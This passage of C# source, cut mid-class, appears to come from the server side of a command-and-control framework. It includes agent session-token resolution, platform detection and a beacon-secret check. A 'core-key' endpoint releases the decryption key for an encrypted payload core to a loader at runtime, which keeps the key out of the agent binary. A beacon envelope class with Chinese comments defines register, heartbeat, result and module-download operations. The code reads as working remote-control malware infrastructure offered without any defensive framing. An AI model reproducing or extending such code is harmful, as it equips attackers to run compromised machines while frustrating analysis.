    private string? ResolveAgentId(HttpRequest request)
    {
        var token = request.Headers["X-Request-Id"].FirstOrDefault();
        if (!string.IsNullOrEmpty(token))
        {
            if (_commsService.TryResolveSessionToken(token, out var agentId) && !string.IsNullOrEmpty(agentId))
                return agentId;
            return null; // Unknown token — do NOT fall back, tokens are authoritative when present.
        }
        return request.Headers["X-Agent-Id"].FirstOrDefault();
    }

    private async Task<string?> ResolveAgentPlatformAsync(string agentId)
    {
        var agent = await _agentService.GetByIdAsync(agentId);
        if (agent == null) return null;

        var os = agent.OsVersion ?? "";
        var arch = agent.Arch ?? "";
        if (os.Contains("Linux", StringComparison.OrdinalIgnoreCase))
            return "linux-x64";
        if (os.Contains("Windows", StringComparison.OrdinalIgnoreCase) || os.Contains("win32", StringComparison.OrdinalIgnoreCase))
            return arch.Contains("86") && !arch.Contains("64") ? "x86" : "x64";

        // Fall back to a host-based guess.
        return OperatingSystem.IsWindows()
            ? (arch.Contains("86") && !arch.Contains("64") ? "x86" : "x64")
            : "linux-x64";
    }

    private bool IsSecretRequired() => !string.IsNullOrWhiteSpace(_beaconSettings.Secret);

    private bool IsSecretValid(string? provided) =>
        string.Equals(provided, _beaconSettings.Secret, StringComparison.Ordinal);

    /// <summary>
    /// Negotiate the core decryption key with a loader at runtime. The loader
    /// presents its ephemeral RSA public key + the build's BeaconSecret; the
    /// server encrypts the core AES key with it. No private key is ever embedded
    /// in the agent binary.
    /// </summary>
    [HttpPost("core-key")]
    public IActionResult CoreKey([FromBody] CoreKeyRequest request)
    {
        if (IsSecretRequired() && !IsSecretValid(request.BeaconSecret))
            return Unauthorized(new { error = "invalid beacon secret" });

        if (string.IsNullOrWhiteSpace(request.BuildId) ||
            request.BuildId.Any(c => !char.IsAsciiLetterOrDigit(c)))
            return BadRequest(new { error = "invalid build id" });

        if (string.IsNullOrWhiteSpace(request.PublicKey))
            return BadRequest(new { error = "missing public key" });

        var keyPath = Path.Combine(BuildsDir, request.BuildId, "core.key");
        if (!System.IO.File.Exists(keyPath))
            return NotFound(new { error = "core key not found" });

        try
        {
            var aesKey = System.IO.File.ReadAllBytes(keyPath);
            var encrypted = CryptoHelper.RsaEncrypt(aesKey, request.PublicKey);
            return Ok(new { encryptedKey = Convert.ToBase64String(encrypted) });
        }
        catch
        {
            return BadRequest(new { error = "invalid public key" });
        }
    }
}

public class CoreKeyRequest
{
    public string BuildId { get; set; } = string.Empty;
    public string PublicKey { get; set; } = string.Empty;
    public string? BeaconSecret { get; set; }
}

/// <summary>密文内部的路由信封（单入口模式）：op 决定服务端分发。</summary>
public class BeaconEnvelope
{
    /// <summary>reg=注册 / hb=心跳 / res=结果 / mod=模块下载</summary>
    public string Op { get; set; } = string.Empty;
    /// <summary>会话 token（reg 时为注册数据）</summary>
    public string Id { get; set; } = string.Empty;
    /// <summary>业务数据（JSON 字符串）</summary>
    public string Data { get; set; } = string.Empty;
}
